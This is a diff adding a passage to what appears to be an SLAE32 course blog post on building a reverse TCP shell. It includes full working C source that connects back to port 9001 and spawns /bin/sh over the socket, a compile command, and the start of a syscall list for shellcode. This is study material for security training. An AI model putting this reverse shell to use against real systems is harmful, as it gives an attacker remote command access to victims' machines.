@@ -26,3 +26,61 @@ image: /assets/img/post/slae32/slae32.png
 Oppose to a Bind Shell, a Reverse Shell connects back to the attacker's computer upon a payload executed on the victim's system. This type of shell is more useful when the target organization has a strong Firewalls for inbound connection. The Reverse Shell can take the advantage of common outbound ports such as port 80, 443, 53 and etc. 
 
 ![image](/assets/img/post/slae32/assignment2/01.png)
+
+# Socket Programming
+Similar to the Bind TCP Shell exercise, let's create a Reverseh TCP Shell in a higher programming language. We will use `C` again:
+
+```c++
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+int main()
+{
+    int sockfd, acceptfd;
+	int port = 9001;
+
+	// Address struct
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port); 
+    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+   	// 1) Socket Syscall (sys_socket 1)
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    // 2) Connect Syscall
+    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
+    
+    // 3) Dup2 Syscall
+    dup2(sockfd, 0);    //stdin
+    dup2(sockfd, 1);    //stdout
+    dup2(sockfd, 2);    //stderr
+
+    // 4) Execve Syscall
+    execve("/bin/sh", NULL, NULL);
+    return 0;
+}
+```
+
+Let's compile this: 
+
+```console
+gcc reverse-tcp-shell.c -o reverse-tcp-shell -w
+```
+
+The compiled reverse shell binary can successfully connect back to `127.0.0.1:9001` as expected.
+
+![image](/assets/img/post/slae32/assignment2/02.png)
+
+
+# Shellcode
+
+For the Reverse TCP Shell, we need to following `syscalls`:
+
+1) Socket
+2) Connect 
+3) Dup2
+4) Execve
